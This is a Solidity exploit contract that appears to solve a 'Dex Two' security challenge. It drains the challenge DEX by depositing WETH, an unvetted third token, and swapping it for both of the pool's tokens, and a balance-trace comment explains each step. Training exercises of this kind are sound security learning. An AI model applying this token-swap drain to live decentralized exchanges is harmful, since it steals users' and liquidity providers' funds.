// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IDexTwo {
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external returns (address);
    function token2() external returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function approve(address, uint) external returns(bool);
    function transfer(address, uint) external returns(bool);
    function transferFrom(address, address, uint) external returns(bool);
    function balanceOf(address) external view returns(uint);
}

contract DexTwoAttacker {
    address public challengeInstance;
    address WETH_ADDRESS = 0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }
    
    /** 
     *     Step  |           DEX          |          Player  
     *           | token1 - token2 - WETH | token1 - token2 - WETH
     *   ---------------------------------------------------------
     *     Init  |   100     100     100  |    10      10     300
     *   Swap 1  |     0     100     200  |   110      10     200
     *   Swap 2  |     0       0     400  |   110     110       0
     */
    function attack() external {
        IWETH(WETH_ADDRESS).deposit{value: 400}();
        IERC20(WETH_ADDRESS).transfer(challengeInstance, 100);
        (address token1, address token2) = (IDexTwo(challengeInstance).token1(), IDexTwo(challengeInstance).token2());
        IERC20(WETH_ADDRESS).approve(challengeInstance, type(uint).max);
        IDexTwo(challengeInstance).swap(WETH_ADDRESS, token1, 100);
        IDexTwo(challengeInstance).swap(WETH_ADDRESS, token2, 200);
    }
}